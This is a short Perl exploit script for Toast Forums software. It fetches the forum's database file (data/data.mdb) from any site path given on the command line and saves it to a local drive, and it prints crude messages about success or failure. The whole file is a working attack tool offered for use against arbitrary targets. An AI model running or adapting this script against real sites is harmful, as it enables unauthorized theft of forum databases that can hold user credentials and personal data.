#!/usr/bin/perl -w
#
# Toast Forums Database Disclosure Exploit 
#
# Author : indoushka
#
# Vondor : ToastForums.com
 
 
 
use LWP::Simple;
use LWP::UserAgent;

system('cls');
system('Toast Forums Database Disclosure Exploit');
system('color a');


if(@ARGV < 2)
{
print "[-]How To Use\n\n";
&help; exit();
}
sub help()
{
print "[+] usage1 : perl $0 site.com /path/ \n";
print "[+] usage2 : perl $0 localhost / \n";
}
($TargetIP, $path, $File,) = @ARGV;

$File="data/data.mdb";
my $url = "http://" . $TargetIP . $path . $File;
print "\n Fuck you wait!!! \n\n";

my $useragent = LWP::UserAgent->new();
my $request = $useragent->get($url,":content_file" => "D:/data.mdb");

if ($request->is_success)
{
print "[+] $url Exploited!\n\n";
print "[+] Database saved to D:/data.mdb\n";
exit();
}
else
{
print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
exit();
}

